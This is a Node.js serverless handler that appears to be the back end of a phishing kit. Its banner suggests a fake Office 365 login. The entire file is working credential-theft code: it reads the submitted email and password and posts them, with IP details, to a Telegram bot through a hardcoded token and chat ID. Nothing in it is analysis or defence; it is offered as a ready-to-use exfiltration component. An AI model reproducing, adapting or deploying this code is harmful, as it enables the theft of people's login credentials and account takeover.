const fetch = require("node-fetch");

exports.handler = async (event) => {
    // Parse the email and password from the request body
    const { email, password } = JSON.parse(event.body);

    // Your Telegram bot token and chat ID
    const TELEGRAM_BOT_TOKEN = "7272693872:AAH2ah-x48_6-XrNqy6uLvnkjtKBEKiymVU"; // Your bot token
    const TELEGRAM_CHAT_ID = "8041820202"; // Your chat ID

    // Prepare the message in the required format
    const message = `
|----------| xLOFFICE365/SCH s |--------------|
Online ID            : ${email}
Passcode              : ${password}
|--------------- I N F O | I P -------------------|
|Client IP: 172.69.37.138
|--- http://www.geoiptool.com/?IP=172.69.37.138
Geo Data Tool - View my IP information: 52.167.144.181
View my IP information: 52.167.144.181
    `;

    // Prepare the Telegram API URL
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    // Prepare the message payload
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    };

    try {
        // Send the message to Telegram
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
        });

        // Parse the response
        const data = await response.json();
        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Message sent to Telegram", data }),
        };
    } catch (error) {
        // Handle errors
        return {
            statusCode: 500,
            body: JSON.stringify({ error: "Error sending message to Telegram" }),
        };
    }
};
